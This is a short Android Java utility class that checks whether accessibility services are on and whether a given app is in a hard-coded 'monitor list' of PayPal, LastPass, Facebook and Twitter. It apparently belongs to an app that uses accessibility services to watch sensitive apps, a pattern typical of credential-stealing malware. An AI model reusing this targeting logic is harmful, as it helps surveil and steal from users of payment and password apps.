package com.mobimagic.littlerabbit;

import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;

public class Utils {
	
	public static boolean DEBUG = true;
	public static String SD_FILE_NAME = "rp_t";
	
	public static String[] pNames = {
		"com.paypal.android.p2pmobile",
		"com.lastpass.lpandroid",
		"com.facebook.katana",
		"com.twitter.android",
	};

	public static boolean isMyAccessibilitySettingEnable(Context context){
		boolean ret = false;
	    String resultString = Settings.Secure.getString(context.getContentResolver(),Settings.Secure.ACCESSIBILITY_ENABLED);
	    if (!TextUtils.isEmpty(resultString) && resultString.equals("1")){
	    	ret = true;
	    }
	    return ret;
	}
	
	public static boolean isAppInMonitorList(String pName){
		boolean ret = false;
		if (!TextUtils.isEmpty(pName)){
			for (String _pName : pNames){
				if (pName.equals(_pName)){
					ret = true;
					break;
				}
			}
		}
		return ret;
	}
}
